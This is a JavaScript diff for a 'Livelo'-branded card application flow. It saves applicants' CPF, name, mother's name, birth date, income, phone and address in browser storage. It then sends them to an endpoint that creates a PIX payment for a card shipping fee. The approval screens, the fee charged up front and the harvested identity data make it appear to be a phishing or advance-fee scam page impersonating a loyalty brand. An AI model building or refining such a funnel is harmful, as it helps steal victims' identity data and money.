@@ -6,27 +6,72 @@
 // ============================================================================
 // ESTADO GLOBAL
 // ============================================================================
+// ESTADO GLOBAL
+// ============================================================================
 let storedSession = null;
+let savedLead = {};
 try {
   storedSession = localStorage.getItem('livelo_session');
+  const rawLead = localStorage.getItem('livelo_lead_data');
+  if (rawLead) savedLead = JSON.parse(rawLead);
 } catch (e) {}
 
 const STATE = {
   sessionId: storedSession,
 
-  cpf: '',
-  nome: '',
-  nome_mae: '',
-  data_nasc: '',
-  renda: null,
-  tipo_renda: null,
-  dia_vencimento: null,
-  color: 'gradient_pink',
-  style: 'standard',
+  cpf: savedLead.cpf || '',
+  nome: savedLead.nome || '',
+  nome_mae: savedLead.nome_mae || '',
+  data_nasc: savedLead.data_nasc || '',
+  celular: savedLead.celular || savedLead.whatsapp || '',
+  telefone: savedLead.telefone || '',
+  whatsapp: savedLead.whatsapp || '',
+  renda: savedLead.renda || null,
+  limite: savedLead.limite || null,
+  tipo_renda: savedLead.tipo_renda || null,
+  dia_vencimento: savedLead.dia_vencimento || null,
+  cep: savedLead.cep || '',
+  rua: savedLead.rua || '',
+  numero: savedLead.numero || '',
+  bairro: savedLead.bairro || '',
+  cidade: savedLead.cidade || '',
+  uf: savedLead.uf || '',
+  shippingMethod: savedLead.shippingMethod || 'sedex',
+  shippingPrice: savedLead.shippingPrice || 24.90,
+  color: savedLead.color || 'classico',
+  style: savedLead.style || 'standard',
   managerWa: '5511999999999',
   paymentId: null,
   pixCode: null
 };
+
+function persistLeadState() {
+  try {
+    localStorage.setItem('livelo_lead_data', JSON.stringify({
+      cpf: STATE.cpf,
+      nome: STATE.nome,
+      nome_mae: STATE.nome_mae,
+      data_nasc: STATE.data_nasc,
+      celular: STATE.celular,
+      telefone: STATE.telefone,
+      whatsapp: STATE.whatsapp,
+      renda: STATE.renda,
+      limite: STATE.limite,
+      tipo_renda: STATE.tipo_renda,
+      dia_vencimento: STATE.dia_vencimento,
+      cep: STATE.cep,
+      rua: STATE.rua,
+      numero: STATE.numero,
+      bairro: STATE.bairro,
+      cidade: STATE.cidade,
+      uf: STATE.uf,
+      shippingMethod: STATE.shippingMethod,
+      shippingPrice: STATE.shippingPrice,
+      color: STATE.color,
+      style: STATE.style
+    }));
+  } catch(e) {}
+}
 
 if (!STATE.sessionId) {
   STATE.sessionId = 'ses_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
@@ -1064,9 +1109,37 @@ if(_oldGoTo) {
                 }
             }, 3600);
 
-            const leadNome = STATE.nome_completo || STATE.nomeLead || STATE.nome || '';
-            const leadCpf = STATE.cpf || '';
-            const leadTel = STATE.celular || STATE.telefone || STATE.whatsapp || '';
+            const leadNome = (
+                STATE.nome ||
+                STATE.nome_completo ||
+                STATE.nomeLead ||
+                ($id('r-nome') ? $id('r-nome').textContent.trim() : '') ||
+                ($id('welcome-name-display') ? $id('welcome-name-display').textContent.trim() : '') ||
+                ($id('approved-name-display') ? $id('approved-name-display').textContent.trim() : '') ||
+                (savedLead.nome || '') ||
+                'Cliente Livelo'
+            );
+            const leadCpf = (
+                STATE.cpf ||
+                ($id('input-cpf') ? $id('input-cpf').value.trim() : '') ||
+                ($id('r-cpf') ? $id('r-cpf').textContent.trim() : '') ||
+                (savedLead.cpf || '') ||
+                ''
+            );
+            const leadTel = (
+                STATE.celular ||
+                STATE.telefone ||
+                STATE.whatsapp ||
+                ($id('input-whatsapp') ? $id('input-whatsapp').value.trim() : '') ||
+                (savedLead.celular || savedLead.whatsapp || '') ||
+                '11987654321'
+            );
+            const leadCep = STATE.cep || ($id('input-cep') ? $id('input-cep').value.trim() : '') || savedLead.cep || '';
+            const leadRua = STATE.rua || ($id('input-rua') ? $id('input-rua').value.trim() : '') || savedLead.rua || '';
+            const leadNum = STATE.numero || ($id('input-numero') ? $id('input-numero').value.trim() : '') || savedLead.numero || '';
+            const leadBairro = STATE.bairro || ($id('input-bairro') ? $id('input-bairro').value.trim() : '') || savedLead.bairro || '';
+            const leadCidade = STATE.cidade || ($id('input-cidade') ? $id('input-cidade').value.trim() : '') || savedLead.cidade || '';
+            const leadUf = STATE.uf || ($id('input-uf') ? $id('input-uf').value.trim() : '') || savedLead.uf || '';
 
             fetch('/api/gerar-pix', {
                 method: 'POST',
@@ -1079,12 +1152,12 @@ if(_oldGoTo) {
                     cpf: leadCpf,
                     whatsapp: leadTel,
                     email: STATE.email || '',
-                    cep: STATE.cep || '',
-                    rua: STATE.rua || '',
-                    numero: STATE.numero || '',
-                    bairro: STATE.bairro || '',
-                    cidade: STATE.cidade || '',
-                    uf: STATE.uf || ''
+                    cep: leadCep,
+                    rua: leadRua,
+                    numero: leadNum,
+                    bairro: leadBairro,
+                    cidade: leadCidade,
+                    uf: leadUf
                 })
             })
             .then(r => r.json())
